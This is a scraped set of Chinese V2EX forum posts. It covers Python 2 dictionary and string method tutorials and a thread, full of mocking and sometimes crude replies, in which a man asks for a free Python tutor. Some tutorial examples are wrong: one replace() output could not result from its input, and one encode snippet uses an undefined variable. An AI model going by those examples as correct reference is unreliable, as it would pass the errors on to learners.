为字典所有键对应的初始值</p>\n<blockquote>\n<p>fromkeys(S, v=None):</p>\n</blockquote>\n<p>|属性|描述|\n|:--|:--|\n|S|字典键值列表|\n|v|可选参数, 设置键序列（ seq ）的值|</p>\n<pre><code>&gt;&gt;&gt; seq = ('name', 'age', 'sex')\n&gt;&gt;&gt; dict = dict.fromkeys(seq)\n&gt;&gt;&gt; dict\n{'age': None, 'name': None, 'sex': None}\n</code></pre>\n<p>fromkeys 方法就是把一个字典的 key 更新到另外一个字典中，默认的值可以设置</p>\n<pre><code>&gt;&gt;&gt; dic={\"k1\":123,\"k2\":456,\"k4\":111}\n&gt;&gt;&gt; dic\n{'k1': 123, 'k4': 111, 'k2': 456}\n# 创建一个新的字典，默认值是`123`\n&gt;&gt;&gt; dic.fromkeys([\"k1\",\"k2\",\"k3\"],\"123\")\n{'k1': '123', 'k3': '123', 'k2': '123'}\n</code></pre>\n<p>返回指定键的值，如果值不在字典中返回默认值</p>\n<blockquote>\n<p>get(self, k, d=None):</p>\n</blockquote>\n<p>|属性|描述|\n|:--|:--|\n|key|字典中要查找的键|\n|default|如果指定键的值不存在时，返回该默认值值|</p>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"ansheng\", 'age': 18}\n&gt;&gt;&gt; person.get(\"name\")\n'ansheng'\n</code></pre>\n<p>成员运算符 in 可以判断键是否存在于字典中，如果键在字典 dict 里返回 true ，否则返回 false</p>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"mr\", 'age': 18}\n&gt;&gt;&gt; 'name' in person\nTrue\n&gt;&gt;&gt; 'aname' in person\nFalse\n</code></pre>\n<p>以列表返回可遍历的(键, 值)元组数组</p>\n<blockquote>\n<p>items(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"mr.wu\", 'age': 18}\n# 以元组的方式输出出来\n&gt;&gt;&gt; person.items()\n[('age', 18), ('name', 'mr.wu')]\n</code></pre>\n<p>以迭代器的方式返回字典的键和值</p>\n<blockquote>\n<p>iteritems(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person.iteritems()\n&lt;dictionary-itemiterator object at 0x000000000297FEF8&gt;\n</code></pre>\n<p>迭代 key</p>\n<blockquote>\n<p>iterkeys(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"ansheng\", 'age': 18}\n&gt;&gt;&gt; person.iterkeys()\n&lt;dictionary-keyiterator object at 0x000000000297FF98&gt;\n</code></pre>\n<p>迭代 value</p>\n<blockquote>\n<p>itervalues(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"ansheng\", 'age': 18}\n&gt;&gt;&gt; person.itervalues()\n&lt;dictionary-valueiterator object at 0x000000000297FF48&gt;\n</code></pre>\n<p>以列表的形式返回一个字典所有的键</p>\n<blockquote>\n<p>keys(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"ansheng\", 'age': 18}\n&gt;&gt;&gt; person.keys()\n['age', 'name']\n</code></pre>\n<p>删除指定给定键所对应的值，返回这个值并从字典中把它移除</p>\n<blockquote>\n<p>pop(self, k, d=None):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"ansheng\", 'age': 18}\n&gt;&gt;&gt; person\n{'age': 18, 'name': 'ansheng'}\n# 返回删除键对应的值\n&gt;&gt;&gt; person.pop(\"age\")\n18\n&gt;&gt;&gt; person\n{'name': 'ansheng'}\n</code></pre>\n<p>随机返回并删除字典中的一对键和值，因为字典是无序的，没有所谓的\"最后一项\"或是其它顺序。</p>\n<blockquote>\n<p>popitem(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"ansheng\", 'age': 18}\n# 随即删除并显示所删除的键和值\n&gt;&gt;&gt; person.popitem()\n('age', 18)\n&gt;&gt;&gt; person\n{'name': 'ansheng'}\n</code></pre>\n<p>如果 key 不存在，则创建，如果存在，则返回已存在的值且不修改</p>\n<blockquote>\n<p>setdefault(self, k, d=None):</p>\n</blockquote>\n<p>|属性|描述|\n|:--|:--|\n|key|查找的键值|\n|default|键不存在时，设置的默认键值|</p>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"ansheng\", 'age': 18}\n# 如果字典中有这个键，那么就输出这个键的值\n&gt;&gt;&gt; person.setdefault(\"name\")\n'ansheng'\n# 如果没有则不输出，但是会创建一个键，值为默认的'None'，值是可以指定的\n&gt;&gt;&gt; person.setdefault(\"sex\")\n&gt;&gt;&gt; person\n{'age': 18, 'name': 'ansheng', 'sex': None}\n\n</code></pre>\n<p>把字典 dic2 的键 /值对更新到 dic1 里</p>\n<blockquote>\n<p>update(self, E=None, **F):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; dic1 = {\"name\":\"ansheng\"}\n&gt;&gt;&gt; dic2 = {\"age\":\"18\"}\n&gt;&gt;&gt; dic1\n{'name': 'ansheng'}\n&gt;&gt;&gt; dic2\n{'age': '18'}\n&gt;&gt;&gt; dic1.update(dic2)\n&gt;&gt;&gt; dic1\n{'age': '18', 'name': 'ansheng'}\n</code></pre>\n<p>显示字典中所有的值</p>\n<blockquote>\n<p>values(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"ansheng\", 'age': 18}\n&gt;&gt;&gt; person.values()\n[18, 'ansheng']\n</code></pre>\n<p>所有项，只是将内容保存至 view 对象中</p>\n<blockquote>\n<p>viewitems(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"ansheng\", 'age': 18}\n&gt;&gt;&gt; person.viewitems()\ndict_items([('age', 18), ('name', 'ansheng')])\n</code></pre>\n<blockquote>\n<p>viewkeys(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"ansheng\", 'age': 18}\n&gt;&gt;&gt; person.viewkeys()\ndict_keys(['age', 'name'])\n</code></pre>\n<blockquote>\n<p>viewvalues(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person = {\"name\": \"ansheng\", 'age': 18}\n&gt;&gt;&gt; person.viewvalues()\ndict_values([18, 'ansheng'])\n</code></pre>\n<p>对字典的键进行排序，其原理就是把 key 转换为列表，然后使用<code>sort</code>对列表排序，最后根据列表循环字典中的值</p>\n<pre><code>&gt;&gt;&gt; D = {'a':1,'b':2,'c':3}\n&gt;&gt;&gt; D\n{'a': 1, 'c': 3, 'b': 2}\n&gt;&gt;&gt; Ks = list(D.keys())\n&gt;&gt;&gt; Ks\n['a', 'c', 'b']\n&gt;&gt;&gt; Ks.sort()\n&gt;&gt;&gt; Ks\n['a', 'b', 'c']\n&gt;&gt;&gt; for k in Ks: print(k, D[k])\n... \na 1\nb 2\nc 3\n</code></pre>\n<hr>\n<h2><a href=\"https://blog.ansheng.me/article/python-full-stack-way-dict-data-type/\" rel=\"nofollow\">原文链接</a></h2>\n<p><a href=\"https://blog.ansheng.me/article/python-full-stack-way/\" rel=\"nofollow\">Python 全栈之路系列文章</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Python 全栈之路系列之字典数据类型", "comment": []},
{"content": ["<div class=\"topic_content\">楼主男， 28 岁，产品新人，一直对 Python 很感兴趣，也看了一些基础教材，但是没有特别有趣的项目做，一直没能深入学。希望有大神能带我入个门。做点有意思的事情。线上线下都行。坐标杭州。\r<br>本人脑子应该还算聪明。\r<br>谢谢啦。\r<br>微信 ID granulite</div>"], "reply": "142", "tittle": "征个人教我学 Python", "comment": ["呃，有扯皮的功夫 imooc 看个视频教程都入门了", "人心不古啊，放 2000 年初那时高手都很单纯， LZ 这贴基本不会被喷。\r", "\r", "现在嘛，看到征人竟然不给钱第一反应就是 WTF ！这不是耍流氓？别人的时间就不是钱？凭什么啊？大家都很现实。", "博士啊…看来楼主是比较谦虚了。应该是打算上 github 搞开源项目的程度。", "帅吗!", "男的？除非是伪娘，否则谁有空", "男的算了        我还想挣个女朋友呢", "   这叫做钓鱼执法", "前三个字就可以终结此帖了", " +1", "到处是教程，谁有这闲功夫。", "网上到处免费的收费的好资源，还要招个人手把手教你，并且你还是个男的。算了吧", "「希望有大神能带我入个门。做点有意思的事情。线上线下都行。」\r", "\r", "这真的不是在暗示什么吗？", "这是博士在 V2 被黑得最惨的一次。", "起码说下是啥专业背景吧，这样才知道如何入手不是", "说点干货，教你，你给多少钱？", "征老师：\r", "本人男，坐标帝都，抽烟喝酒，无其他嗜好（因平时开车故酒量一斤但不怎么喝，喝多了睡觉不打人不惹事，抽烟没瘾，一周不抽或者一天一包都可）。\r", "名下车 6 辆，其中朋友岳父名字的车一辆，其余为我名字，房四套，北二环，西二环，东三环，北五环。\r", "无计算机基础，大学学过 c 语言，基本都忘了，用苹果电脑，会 shell 。\r", "先征集 python 老师一名，要求：\r", "性别：女，年龄： 18-28 ，肤白貌美，端庄贤惠，无不良嗜好，有孝心，会煮饭做家务（家里有两位保姆，但我还是希望你会做）。会 python ，有耐心带我做一些有意思的小程序。\r", "薪资面议。\r", "\r", "---------------------------------\r", "\r", "楼主，我觉得应该这样照老师，你觉得呢？", " 好污~~~", "男的？又不是 Gay 干嘛免费教你 ...", "v2ex 还是我认识的那个 V2EX ，大家的时间都很宝贵的，这样的帖子就是找喷。。。", "页面右侧不是有好多东西么", "讲真，底下要钱的各位，水平可能还没你高…", " 那时候可不像现在各种收费或免费的教程 书籍 铺天盖地", "应该是今年冷嘲热讽最多的帖子...", "直接甩链接，我做的，线上的，收费的\r", " 喜欢程序员这个群体又没自信能找到一个，于是选择了坐到他们中间工作，喜欢 V2 也和这个原因有关。所以还是有的。 xD", "征个女友，带我回家过年", " 所以说中国的博士也就是这样了。。。。硕士路过。。", "不知道楼主哪来的自信", "尴尬，看到“征”字就默认认为楼主付费。", "codecombat 欢迎你，在游戏中学习 Python ，从基础到高级应用都有。\r", "官网是 ", "  需要翻墙。\r", "不想翻墙的话可以用国内的镜像， codecombat 是开源的，所以国内很多爱好者搭建了服务器。百度 `codecombat 中国` 即可。", "征个仆人伺候本小姐，报名的请排队", "你们太不友善了........", " 妹纸棒棒的！", " 活捉一只 6 老师", "学习这事还要靠自己的，其他都是扯淡。", " 所以说中国人也就这样了，地球人路过。", "Python 这么简单的语言随便买本书学学就够了。\r", "另外，网络教程推荐 ", "讲真，这是博士在 v2 被黑的最惨的一次", " 可以啪啪不，可以的话，我排队，哈哈哈", " 讲道理颜好身材好性格好,绝对是能招到的,说了那么多 你先爆个照", " 就服你!", "博士应该工资很高吧，花点钱找个优秀老师 不是什么大问题。     请问你有时间教别人？  免费做家教可以吗？数学，英语？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>字符串(str)</h2>\n<p>字符串类型是 python 的序列类型，他的本质就是字符序列，而且 python 的字符串类型是不可以改变的，你无法将原字符串进行修改，但是可以将字符串的一部分复制到新的字符串中，来达到相同的修改效果。</p>\n<p>创建字符串类型可以使用单引号或者双引号又或者三引号来创建，实例如下：</p>\n<p>单引号</p>\n<pre><code>&gt;&gt;&gt; string = 'ansheng'\n# type 是查看一个变量的数据类型\n&gt;&gt;&gt; type(string)\n&lt;class 'str'&gt;\n</code></pre>\n<p>双引号</p>\n<pre><code>&gt;&gt;&gt; string = \"ansheng\"\n# type 是查看一个变量的数据类型\n&gt;&gt;&gt; type(string) \n&lt;class 'str'&gt;\n</code></pre>\n<p>三引号</p>\n<pre><code>&gt;&gt;&gt; string = \"\"\"ansheng\"\"\"\n&gt;&gt;&gt; type(string)\n&lt;class 'str'&gt;\n</code></pre>\n<p>还可以指定类型</p>\n<pre><code>&gt;&gt;&gt; var=str(\"string\")\n&gt;&gt;&gt; var\n'string'\n&gt;&gt;&gt; type(var)\n&lt;class 'str'&gt;\n</code></pre>\n<h3>字符串方法</h3>\n<blockquote>\n<p>每个类的方法其实都是很多的，无论我们在学习的过程中个还是工作的时候，常用的其实没有多少，所以我们没必要去可以得记那么多，有些方法我们只需要对其有个印象就 ok 了，忘了的时候可以 google 一下。</p>\n</blockquote>\n<p>首字母变大写</p>\n<blockquote>\n<p>capitalize(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; name=\"ansheng\"\n&gt;&gt;&gt; name.capitalize()\n'Ansheng'\n</code></pre>\n<p>内容居中， width ：字符串的总宽度； fillchar ：填充字符，默认填充字符为空格。</p>\n<blockquote>\n<p>center(self, width, fillchar=None):</p>\n</blockquote>\n<pre><code># 定义一个字符串变量，名为\"string\"，内容为\"hello word\"\n&gt;&gt;&gt; string=\"hello word\"\n# 输出这个字符串的长度，用 len(value_name)\n&gt;&gt;&gt; len(string)\n10\n# 字符串的总宽度为 10 ，填充的字符为\"*\"\n&gt;&gt;&gt; string.center(10,\"*\")\n'hello word'\n# 如果设置字符串的总产都为 11 ，那么减去字符串长度 10 还剩下一个位置，这个位置就会被*所占用\n&gt;&gt;&gt; string.center(11,\"*\")\n'*hello word'\n# 是从左到右开始填充\n&gt;&gt;&gt; string.center(12,\"*\")\n'*hello word*'\n</code></pre>\n<p>统计字符串里某个字符出现的次数,可选参数为在字符串搜索的开始与结束位置。</p>\n<blockquote>\n<p>count(self, sub, start=None, end=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|sub|搜索的子字符串;|\n|start|字符串开始搜索的位置。默认为第一个字符,第一个字符索引值为 0;|\n|end|字符串中结束搜索的位置。字符中第一个字符的索引为 0 。默认为字符串的最后一个位置;|</p>\n<pre><code>&gt;&gt;&gt; string=\"hello word\"\n# 默认搜索出来的\"l\"是出现过两次的\n&gt;&gt;&gt; string.count(\"l\")\n2\n# 如果指定从第三个位置开始搜索，搜索到第六个位置，\"l\"则出现过一次\n&gt;&gt;&gt; string.count(\"l\",3,6)\n1\n</code></pre>\n<p>解码</p>\n<blockquote>\n<p>decode(self, encoding=None, errors=None):</p>\n</blockquote>\n<pre><code># 定义一个变量内容为中文\ntemp = \"中文\"\n# 把变量的字符集转化为 UTF-8\ntemp_unicode = temp.decode(\"utf-8\")\n</code></pre>\n<p>编码，针对 unicode</p>\n<blockquote>\n<p>encode(self, encoding=None, errors=None):</p>\n</blockquote>\n<pre><code># 定义一个变量内容为中文,字符集为 UTF-8\ntemp = u\"中文\"\n# 编码，需要指定要转换成什么编码\ntemp_gbk = temp_unicode.encode(\"gbk\")\n</code></pre>\n<p>于判断字符串是否以指定后缀结尾，如果以指定后缀结尾返回 True ，否则返回 False 。</p>\n<blockquote>\n<p>endswith(self, suffix, start=None, end=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|suffix|后缀，可能是一个字符串，或者也可能是寻找后缀的 tuple|\n|start|开始，切片从这里开始|\n|end|结束，片到此为止|</p>\n<pre><code>&gt;&gt;&gt; string=\"hello word\"\n# 判断字符串中是否已\"d\"结尾，如果是则返回\"True\"\n&gt;&gt;&gt; string.endswith(\"d\")\nTrue\n# 判断字符串中是否已\"t\"结尾，不是则返回\"False\"\n&gt;&gt;&gt; string.endswith(\"t\")\nFalse\n# 制定搜索的位置，实则就是从字符串位置 1 到 7 来进行判断，如果第七个位置是\"d\"，则返回 True ，否则返回 False\n&gt;&gt;&gt; string.endswith(\"d\",1,7)\nFalse\n</code></pre>\n<p>把字符串中的 tab 符号('\\t')转为空格， tab 符号('\\t')默认的空格数是 8 。</p>\n<blockquote>\n<p>expandtabs(self, tabsize=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|tabsize|指定转换字符串中的 tab 符号('\\t')转为空格的字符数|</p>\n<pre><code>&gt;&gt;&gt; string=\"hello       word\"\n# 输出变量\"string\"内容的时候会发现中间有一个\"\\t\"，这个其实就是一个`tab`键\n&gt;&gt;&gt; string\n'hello\\tword'\n# 把`tab`键换成一个空格\n&gt;&gt;&gt; string.expandtabs(1)\n'hello word'\n# 把`tab`键换成十个空格\n&gt;&gt;&gt; string.expandtabs(10)\n'hello     word'\n</code></pre>\n<p>检测字符串中是否包含子字符串 str ，如果指定 beg(开始)和 end(结束)范围，则检查是否包含在指定范围内，如果包含子字符串返回开始的索引值，否则返回-1 。</p>\n<blockquote>\n<p>find(self, sub, start=None, end=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|str|指定检索的字符串|\n|beg|开始索引，默认为 0|\n|end|结束索引，默认为字符串的长度|</p>\n<pre><code>&gt;&gt;&gt; string=\"hello word\"\n# 返回`o`在当前字符串中的位置，如果找到第一个`o`之后就不会再继续往下面寻找了\n&gt;&gt;&gt; string.find(\"o\")\n4\n# 从第五个位置开始搜索，返回`o`所在的位置\n&gt;&gt;&gt; string.find(\"o\",5)\n7\n</code></pre>\n<p>字符串格式，后续文章会提到。</p>\n<blockquote>\n<p>format(*args, **kwargs):</p>\n</blockquote>\n<p>检测字符串中是否包含子字符串 str ，如果指定 beg （开始） 和 end （结束） 范围，则检查是否包含在指定范围内，该方法与 python find()方法一样，只不过如果 str 不在 string 中会报一个异常。</p>\n<blockquote>\n<p>index(self, sub, start=None, end=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|str|指定检索的字符串|\n|beg|开始索引，默认为 0|\n|end|结束索引，默认为字符串的长度|</p>\n<pre><code>&gt;&gt;&gt; string=\"hello word\"\n# 返回字符串所在的位置\n&gt;&gt;&gt; string.index(\"o\")\n4\n# 如果查找一个不存在的字符串那么就会报错\n&gt;&gt;&gt; string.index(\"a\")\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nValueError: substring not found\n</code></pre>\n<p>法检测字符串是否由字母和数字组成，如果 string 至少有一个字符并且所有字符都是字母或数字则返回 True,否则返回 False</p>\n<blockquote>\n<p>isalnum(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; string=\"hes2323\"\n# 如果存在数字或字母就返回`True`，否则返回`False`\n&gt;&gt;&gt; string.isalnum()\nTrue\n# 中间有空格返回的就是 False 了\n&gt;&gt;&gt; string=\"hello word\"\n&gt;&gt;&gt; string.isalnum()\nFalse\n</code></pre>\n<p>检测字符串是否只由字母组成。</p>\n<blockquote>\n<p>isalpha(self):</p>\n</blockquote>\n<pre><code># 如果全部都是字母就返回`True`\n&gt;&gt;&gt; string=\"helloword\"\n&gt;&gt;&gt; string.isalpha()\nTrue\n# 否则就返回 False\n&gt;&gt;&gt; string=\"hes2323\"\n&gt;&gt;&gt; string.isalpha()\nFalse\n</code></pre>\n<p>检测字符串是否只由数字组成</p>\n<blockquote>\n<p>isdigit(self):</p>\n</blockquote>\n<pre><code># 如果变量里面都是数字就返回`True`，否则就返回`False`\n&gt;&gt;&gt; string=\"hes2323\"\n&gt;&gt;&gt; string.isdigit()\nFalse\n&gt;&gt;&gt; string=\"2323\"\n&gt;&gt;&gt; string.isdigit()\nTrue\n</code></pre>\n<p>检测字符串是否由小写字母组成</p>\n<blockquote>\n<p>islower(self):</p>\n</blockquote>\n<pre><code># 如果变量内容全部都是小写字母就返回`True`，否则就返回`False`\n&gt;&gt;&gt; string=\"hesasdasd\"\n&gt;&gt;&gt; string.islower()\nTrue\n&gt;&gt;&gt; string=\"HelloWord\"\n&gt;&gt;&gt; string.islower()\nFalse\n</code></pre>\n<p>检测字符串是否只由空格组成</p>\n<blockquote>\n<p>isspace(self):</p>\n</blockquote>\n<pre><code># 如果变量内容由空格来组成，那么就返回`True`否则就返回`False`\n&gt;&gt;&gt; string=\" \"\n&gt;&gt;&gt; string.isspace()\nTrue\n&gt;&gt;&gt; string=\"a\"\n&gt;&gt;&gt; string.isspace()\nFalse\n</code></pre>\n<p>检测字符串中所有的单词拼写首字母是否为大写，且其他字母为小写。</p>\n<blockquote>\n<p>istitle(self):</p>\n</blockquote>\n<pre><code># 如果变量的内容首字母是大写并且其他字母为小写，那么就返回`True`，否则会返回`False`\n&gt;&gt;&gt; string=\"Hello Word\"\n&gt;&gt;&gt; string.istitle()\nTrue\n&gt;&gt;&gt; string=\"Hello word\"\n&gt;&gt;&gt; string.istitle()\nFalse\n</code></pre>\n<p>检测字符串中所有的字母是否都为大写。</p>\n<blockquote>\n<p>isupper(self):</p>\n</blockquote>\n<pre><code># 如果变量值中所有的字母都是大写就返回`True`，否则就返回`False`\n&gt;&gt;&gt; string=\"hello word\"\n&gt;&gt;&gt; string.isupper()\nFalse\n&gt;&gt;&gt; string=\"HELLO WORD\"\n&gt;&gt;&gt; string.isupper()\nTrue\n</code></pre>\n<p>将序列中的元素以指定的字符连接生成一个新的字符串。</p>\n<blockquote>\n<p>join(self, iterable):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; string=(\"a\",\"b\",\"c\")\n&gt;&gt;&gt; '-'.join(string)\n'a-b-c'\n</code></pre>\n<p>返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。</p>\n<blockquote>\n<p>ljust(self, width, fillchar=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|width|指定字符串长度|\n|fillchar|填充字符，默认为空格|</p>\n<pre><code>&gt;&gt;&gt; string=\"helo word\"\n&gt;&gt;&gt; len(string)\n9\n# 定义的长度减去字符串的长度,剩下的就开始填充\n&gt;&gt;&gt; string.ljust(15,'*')\n'helo word******'\n</code></pre>\n<p>转换字符串中所有大写字符为小写。</p>\n<blockquote>\n<p>lower(self):</p>\n</blockquote>\n<pre><code># 把变量里的大写全部转换成小写\n&gt;&gt;&gt; string=\"Hello WORD\"\n&gt;&gt;&gt; string.lower()\n'hello word'\n</code></pre>\n<p>截掉字符串左边的空格或指定字符</p>\n<blockquote>\n<p>lstrip(self, chars=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|chars|指定截取的字符|</p>\n<pre><code># 从左侧开始删除匹配的字符串\n&gt;&gt;&gt; string=\"hello word\"\n&gt;&gt;&gt; string.lstrip(\"hello \")\n'word'\n</code></pre>\n<p>用来根据指定的分隔符将字符串进行分割，如果字符串包含指定的分隔符，则返回一个 3 元的 tuple ，第一个为分隔符左边的子串，第二个为分隔符本身，第三个为分隔符右边的子串。</p>\n<blockquote>\n<p>partition(self, sep):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|str|指定的分隔符|</p>\n<pre><code># 返回的是一个元组类型\n&gt;&gt;&gt; string=\"www.ansheng.me\"\n&gt;&gt;&gt; string.partition(\"ansheng\")\n('www.', 'ansheng', '.me')\n</code></pre>\n<p>把字符串中的 old(旧字符串)替换成 new(新字符串)，如果指定第三个参数 max ，则替换不超过 max 次</p>\n<blockquote>\n<p>replace(self, old, new, count=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|old|将被替换的子字符串|\n|new|新字符串，用于替换 old 子字符串|\n|count|可选字符串, 替换不超过 count 次|</p>\n<pre><code>&gt;&gt;&gt; string=\"www.ansheng.me\"\n# 把就字符串`www.`换成新字符串`https://`\n&gt;&gt;&gt; string.replace(\"www.\",\"https://\")\n'https://blog.ansheng.me'\n# 就字符串`w`换成新字符串`a`只替换`2`次\n&gt;&gt;&gt; string.replace(\"w\",\"a\",2)\n'aaw.ansheng.me'\n</code></pre>\n<p>返回字符串最后一次出现的位置，如果没有匹配项则返回-1 。</p>\n<blockquote>\n<p>rfind(self, sub, start=None, end=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|str|查找的字符串|\n|beg|开始查找的位置，默认为 0|\n|end|结束查找位置，默认为字符串的长度|</p>\n<pre><code>&gt;&gt;&gt; string=\"hello word\"\n# rfind 其实就是反向查找\n&gt;&gt;&gt; string.rfind(\"o\")\n7\n# 指定查找的范围\n&gt;&gt;&gt; string.rfind(\"o\",0,6)\n4\n</code></pre>\n<p>返回子字符串 str 在字符串中最后出现的位置，如果没有匹配的字符串会报异常，你可以指定可选参数<code>[beg:end]</code>设置查找的区间。</p>\n<blockquote>\n<p>rindex(self, sub, start=None, end=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|str|查找的字符串|\n|beg|开始查找的位置，默认为 0|\n|end|结束查找位置，默认为字符串的长度|</p>\n<pre><code>&gt;&gt;&gt; string=\"hello word\"\n# 反向查找索引\n&gt;&gt;&gt; string.rindex(\"o\")\n7\n# 如果没有查找到就报错\n&gt;&gt;&gt; string.rindex(\"a\")\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nValueError: substring not found\n</code></pre>\n<p>返回一个原字符串右对齐,并使用空格填充至长度 width 的新字符串。如果指定的长度小于字符串的长度则返回原字符串。</p>\n<blockquote>\n<p>rjust(self, width, fillchar=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|width|指定填充指定字符后中字符串的总长度|\n|fillchar|填充的字符，默认为空格|</p>\n<pre><code>&gt;&gt;&gt; string=\"hello word\"\n&gt;&gt;&gt; len(string)\n10\n&gt;&gt;&gt; string.rjust(10,\"*\")\n'hello word'\n&gt;&gt;&gt; string.rjust(12,\"*\")\n'**hello word'\n</code></pre>\n<p>从右到左通过指定分隔符对字符串进行切片,如果参数 num 有指定值，则仅分隔 num 个子字符串</p>\n<blockquote>\n<p>rsplit(self, sep=None, maxsplit=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|str|隔符，默认为空格|\n|num|分割次数|</p>\n<pre><code>&gt;&gt;&gt; string=\"www.ansheng.me\"\n&gt;&gt;&gt; string.rsplit(\".\",1)\n['www.ansheng', 'me']\n&gt;&gt;&gt; string.rsplit(\".\",2)\n['www', 'ansheng', 'me']\n</code></pre>\n<p>删除 string 字符串末尾的指定字符（默认为空格）.</p>\n<blockquote>\n<p>rstrip(self, chars=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|chars|指定删除的字符|</p>\n<pre><code># 从尾部开始匹配删除\n&gt;&gt;&gt; string=\"hello word\"\n&gt;&gt;&gt; string.rstrip(\"d\")\n'hello wor'\n</code></pre>\n<p>从左到右通过指定分隔符对字符串进行切片,如果参数 num 有指定值，则仅分隔 num 个子字符串</p>\n<blockquote>\n<p>split(self, sep=None, maxsplit=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|str|分隔符，默认为空格|\n|num|分割次数|</p>\n<pre><code>&gt;&gt;&gt; string=\"www.ansheng.me\"\n# 指定切一次，以`.`来分割\n&gt;&gt;&gt; string.split(\".\",1)\n['www', 'ansheng.me']\n# 指定切二次，以`.`来分割\n&gt;&gt;&gt; string.split(\".\",2)\n['www', 'ansheng', 'me']\n</code></pre>\n<p>按照行分隔，返回一个包含各行作为元素的列表，如果 num 指定则仅切片 num 个行.</p>\n<blockquote>\n<p>splitlines(self, keepends=False):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|num|分割行的次数|</p>\n<pre><code># 定义一个有换行的变量，`\\n`可以划行\n&gt;&gt;&gt; string=\"www\\nansheng\\nme\"\n# 输出内容\n&gt;&gt;&gt; print(string)\nwww\nansheng\nme\n# 把有行的转换成一个列表\n&gt;&gt;&gt; string.splitlines(1)\n['www\\n', 'ansheng\\n', 'me']\n</code></pre>\n<p>检查字符串是否是以指定子字符串开头，如果是则返回 True ，否则返回 False 。如果参数 beg 和 end 指定值，则在指定范围内检查。</p>\n<blockquote>\n<p>startswith(self, prefix, start=None, end=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|str|检测的字符串|\n|strbeg|可选参数用于设置字符串检测的起始位置|\n|strend|可选参数用于设置字符串检测的结束位置|</p>\n<pre><code>&gt;&gt;&gt; string=\"www.ansheng.me\"\n&gt;&gt;&gt; string.startswith(\"www\")\nTrue\n&gt;&gt;&gt; string.startswith(\"www\",3)\nFalse\n</code></pre>\n<p>移除字符串头尾指定的字符（默认为空格）</p>\n<blockquote>\n<p>strip(self, chars=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|chars|移除字符串头尾指定的字符|</p>\n<pre><code>&gt;&gt;&gt; string=\" www.ansheng.me \"\n&gt;&gt;&gt; string\n' www.ansheng.me '\n# 删除空格\n&gt;&gt;&gt; string.strip()\n'www.ansheng.me'\n&gt;&gt;&gt; string=\"_www.ansheng.me_\"\n# 指定要把左右两边的\"_\"删除掉\n&gt;&gt;&gt; string.strip(\"_\")\n'www.ansheng.me'\n</code></pre>\n<p>用于对字符串的大小写字母进行转换，大写变小写，小写变大写</p>\n<blockquote>\n<p>swapcase(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; string=\"hello WORD\"\n&gt;&gt;&gt; string.swapcase()\n'HELLO word'\n</code></pre>\n<p>返回\"标题化\"的字符串,就是说所有单词都是以大写开始，其余字母均为小写。</p>\n<blockquote>\n<p>title(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; string=\"hello word\"\n&gt;&gt;&gt; string.title()\n'Hello Word'\n</code></pre>\n<p>根据参数 table 给出的表(包含 256 个字符)转换字符串的字符, 要过滤掉的字符放到 del 参数中。</p>\n<blockquote>\n<p>translate(self, table, deletechars=None):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|table|翻译表，翻译表是通过 maketrans 方法转换而来|\n|deletechars|字符串中要过滤的字符列表|</p>\n<p>将字符串中的小写字母转为大写字母</p>\n<blockquote>\n<p>upper(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; string=\"hello word\"\n&gt;&gt;&gt; string.upper()\n'HELLO WORD'\n</code></pre>\n<p>返回指定长度的字符串，原字符串右对齐，前面填充 0</p>\n<blockquote>\n<p>zfill(self, width):</p>\n</blockquote>\n<p>|参数|描述|\n|:--|:--|\n|width|指定字符串的长度。原字符串右对齐，前面填充 0|</p>\n<pre><code>&gt;&gt;&gt; string=\"hello word\"\n&gt;&gt;&gt; string.zfill(10)\n'hello 